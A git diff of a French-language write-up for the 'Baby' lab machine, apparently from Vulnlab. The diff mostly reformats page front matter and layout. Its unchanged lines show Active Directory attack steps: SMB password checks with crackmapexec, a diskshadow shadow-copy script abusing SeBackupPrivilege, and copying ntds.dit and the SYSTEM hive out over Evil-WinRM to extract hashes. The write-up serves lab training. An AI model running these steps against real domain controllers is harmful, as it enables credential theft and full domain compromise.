@@ -1,22 +1,30 @@
 ---
-title: Baby - Easy
-description: WU baby - Easy
+title: Baby
+description: WU baby
 categories: [Writeup]
 tags: [writeup]
 template: doc
+sidebar:
+  order: 1
+  badge:
+    text: 'easy'
+    variant: success
 ---
-Date : 2024-09-10 11:04
+
+import { Image } from 'astro:assets';
+import banner from '../../../../assets/writeup/vulnlab/banner.jpeg';
+
+<Image src={banner} alt="banner" format="avif" quality={"mid"}/>
 
 ## 🔭 Périmètre
-```
-IP: 10.10.124.47
-OS: Windows
-Domaine: baby.vl
-```
+
+| OS | Difficulty | Target |
+|----|----|----|
+| Windows | <span style="color:green">**EASY**</span> | 10.10.124.47 |
+
 ## 🔍 Récupération d'informations 
 
 ### PortScan
-
 
 ```shell wrap
 PORT      STATE SERVICE    VERSION
@@ -106,10 +114,12 @@ crackmapexec smb 10.10.124.47 -u Teresa.Bell -p 'B<retracted>!' --no-bruteforce
 SMB         10.10.124.47    445    BABYDC           [*] Windows 10.0 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
 SMB         10.10.124.47    445    BABYDC           [-] baby.vl\Teresa.Bell:B<retracted>! STATUS_LOGON_FAILURE
 ```
+
 La session teresa.bell a changé de mot de passe. Il faut trouver quel utilisateur n'a pas encore servi.
 En retournant sur le `ldap` on peut voir que Caroline.Robinson n'a aucun attribut `sAMAccountName`.
 
 Testons via `smbpasswd`:
+
 ```shell wrap
 smbpasswd -U caroline.robinson -r 10.10.124.47
 Old SMB password:
@@ -183,12 +193,14 @@ VL{<retracted>}
 
 Pour escalader les privilèges, j'ai suivi cet [article](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/).
 En créant un script:
+
 ```shell wrap
 set context persistent nowriters
 add volume c: alias hip5kull
 create
 expose %hip5kull% z:
 ```
+
 Une fois enregistrer, j'exécute la commande `unix2dos script.dsh` pour convertir le script puis le l'upload sur la target:
 
 ```shell wrap
@@ -245,12 +257,14 @@ The shadow copy was successfully exposed as z:\.
 ```
 
 Une fois le script correctement exécuter nous pouvons récupérer les fichiers `ntds` et `system`:
+
 ```shell wrap
 *Evil-WinRM* PS C:\Temp> robocopy \B Z:\Windows\NTDS . ntds.dit
 *Evil-WinRM* PS C:\Temp> reg save hklm\system c:\Temp\system
 *Evil-WinRM* PS C:\Temp> download ntds.dit
 *Evil-WinRM* PS C:\Temp> download system
 ```
+
 Les fichiers `ntds.dit` et `system` nous permettent d'obtenir les hashes des utilisateurs:
 
 ```shell wrap
